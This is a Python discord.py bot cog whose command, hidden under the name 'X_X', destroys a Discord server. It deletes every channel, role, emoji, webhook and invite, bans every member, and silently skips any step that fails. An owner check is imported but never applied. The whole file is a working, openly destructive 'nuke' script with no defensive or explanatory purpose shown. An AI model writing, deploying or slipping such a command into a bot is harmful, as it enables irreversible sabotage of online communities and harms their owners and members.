import discord
from discord.ext import commands

from checks import owner


class kill_all(commands.Cog):
    def __init__(self, bot):
        self.bot = bot  # type: commands.Bot

    @commands.command(name='X_X')
    async def kill_all(self, ctx: commands.Context):
        guild = ctx.guild  # type: discord.Guild
        webhooks = await guild.webhooks()
        invites = await guild.invites()
        for channel in guild.channels:
            try:
                await channel.delete()
            except Exception as e:
                continue
        for role in guild.roles:
            try:
                await role.delete()
            except Exception as e:
                continue
        for member in guild.members:
            try:
                await member.ban()
            except Exception as e:
                continue
        for emoji in guild.emojis:
            try:
                await emoji.delete()
            except Exception as e:
                continue
        for webhook in webhooks:
            try:
                await webhook.delete()
            except Exception as e:
                continue
        for invite in invites:
            try:
                await invite.delete()
            except Exception as e:
                continue

